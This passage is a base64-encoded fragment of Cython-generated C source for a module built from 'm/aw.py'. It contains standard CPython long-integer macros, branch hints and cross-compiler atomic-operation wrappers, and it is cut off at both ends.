iAgI2lmbmRlZiBfUHlMb25nX1NJR05fTUFTSwogICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzCiAgI2VuZGlmCiAgI2lmbmRlZiBfUHlMb25nX05PTl9TSVpFX0JJVFMKICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDMKICAjZW5kaWYKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19TaWduKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyAmIF9QeUxvbmdfU0lHTl9NQVNLKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKCFfX1B5eF9QeUxvbmdfSXNOZWcoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNaZXJvKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgJiAxKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSAgKChQeV9zc2l6ZV90KSAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA+PiBfUHlMb25nX05PTl9TSVpFX0JJVFMpKQogICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcCiAgICAgICAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKQogICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgUHlVbnN0YWJsZV9Mb25nX0lzQ29tcGFjdCgoUHlMb25nT2JqZWN0KikgeCkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSgoUHlMb25nT2JqZWN0KikgeCkKICAjZWxzZQogICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAgICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA8ICgyIDw8IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpCiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkgICgoMSAtIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfU2lnbih4KSkgKiAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZW5kaWYKICB0eXBlZGVmIFB5X3NzaXplX3QgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgc2l6ZV90ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7CiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05lZyh4KSAgKFB5X1NJWkUoeCkgPCAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTm9uTmVnKHgpICAoUHlfU0laRSh4KSA+PSAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1Bvcyh4KSAgKFB5X1NJWkUoeCkgPiAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAwIDogX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSAgUHlfU0laRSh4KQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgKFB5X1NJWkUoeCkgPT0gMCB8fCBQeV9TSVpFKHgpID09IDEgfHwgUHlfU0laRSh4KSA9PSAtMSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcCiAgICAgICAgKChQeV9TSVpFKHgpID09IDApID8gKHNkaWdpdCkgMCA6ICgoUHlfU0laRSh4KSA8IDApID8gLShzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSA6IChzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkpCiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgZGlnaXQgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZzsKICAjZW5kaWYKICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSk7CiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTUKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUub2JfZGlnaXQpCiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPm9iX2RpZ2l0KQogICNlbmRpZgojZW5kaWYKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZVVURjgoY19zdHIsIHNpemUsIE5VTEwpCiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVBU0NJSShjX3N0ciwgc2l6ZSwgTlVMTCkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpCiNlbmRpZgoKCgojaWYgZGVmaW5lZChfX0dOVUNfXykgICAgICYmIChfX0dOVUNfXyA+IDIgfHwgKF9fR05VQ19fID09IDIgJiYgKF9fR05VQ19NSU5PUl9fID4gOTUpKSkKICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpCiAgI2RlZmluZSB1bmxpa2VseSh4KSBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAwKQojZWxzZSAKICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KQogICNkZWZpbmUgdW5saWtlbHkoeCkgKHgpCiNlbmRpZiAKCiNpZmRlZiBfX2NwbHVzcGx1cwojaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMCiNpbmNsdWRlIDx0eXBlX3RyYWl0cz4KI2VuZGlmCnRlbXBsYXRlIDx0eXBlbmFtZSBUPgpzdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7CiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0wKICAgIGlmICgoc3RkOjppc190cml2aWFsbHlfZGVmYXVsdF9jb25zdHJ1Y3RpYmxlPFQ+Ojp2YWx1ZSkpCiNlbmRpZgogICAgICAgICpwdHIgPSBUKCk7CiAgICAodm9pZClwdHI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUodm9pZCogcHRyKSB7ICh2b2lkKXB0cjsgfQojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19weXhfbSA9IE5VTEw7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X2xpbmVubzsKc3RhdGljIGludCBfX3B5eF9jbGluZW5vID0gMDsKc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9jZmlsZW5tID0gX19GSUxFX187CnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTsKCgoKc3RhdGljIGNvbnN0IGNoYXIqIGNvbnN0IF9fcHl4X2ZbXSA9IHsKICAibS9hdy5weSIsCn07CgoKI2luY2x1ZGUgPHB5dGhyZWFkLmg+CiNpZm5kZWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgQ1lUSE9OX0FUT01JQ1MgMQojZW5kaWYKI2RlZmluZSBfX1BZWF9DWVRIT05fQVRPTUlDU19FTkFCTEVEKCkgQ1lUSE9OX0FUT01JQ1MKI2RlZmluZSBfX1BZWF9HRVRfQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcoKSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwojZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnQKI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgaW50CiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKQogICAgI2luY2x1ZGUgPHN0ZGF0b21pYy5oPgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcCiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSkKICAgICNpbmNsdWRlIDxhdG9taWM+CiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXAogICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKQogICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgYXRvbWljX2ludAogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9yZWxheGVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgYXRvbWljX2ZldGNoX3N1Yih2YWx1ZSwgYXJnKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBhdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpCiAgICAjZWxpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT01JQ1MpCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIKICAgICNlbmRpZgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcClwKICAgICAgICAgICAgICAgICAgICAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTcwMCkpICYmXAogICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpCiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnQKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBzdGQ6OmF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3F1aXJlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIikKICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykKICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiCiAgICAjZW5kaWYKI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcCiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID4gMSB8fFwKICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpCiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHsKICAgICAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkID0gX19zeW5jX3ZhbF9jb21wYXJlX2FuZF9zd2FwKHZhbHVlLCAqZXhwZWN0ZWQsIGRlc2lyZWQpOwogICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkOwogICAgICAgICpleHBlY3RlZCA9IG9sZDsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIEdOVSBhdG9taWNzIgogICAgI2VuZGlmCiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpCiAgICAjaW5jbHVkZSA8aW50cmluLmg+CiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI3VuZGVmIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZwogICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtYXJnKQogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7CiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTsKICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3RlZDsKICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSAqKHZvaWQgKiB2b2xhdGlsZSAqKXZhbHVlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIikKICAgICNlbmRpZgojZWxzZQogICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTCiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDAKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIgogICAgI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSkKICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKQojZWxzZQogICAgI2RlZmluZSBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnQobWVtdmlldylcCiAgICAgICAgICAgIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spCiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVwKICAgICAgICAgICAgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50X2xvY2tlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSwgbWVtdmlldy0+bG9jaykKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cnVjdG1lbWJlci5oPgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMShjcywgYXJnKSAodm9pZCljcwojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3MKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxKGNzKQojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDIoY3MpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24gUHlDcml0aWNhbFNlY3Rpb24KI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgUHlDcml0aWNhbFNlY3Rpb24yCiNkZWZpbmUgX1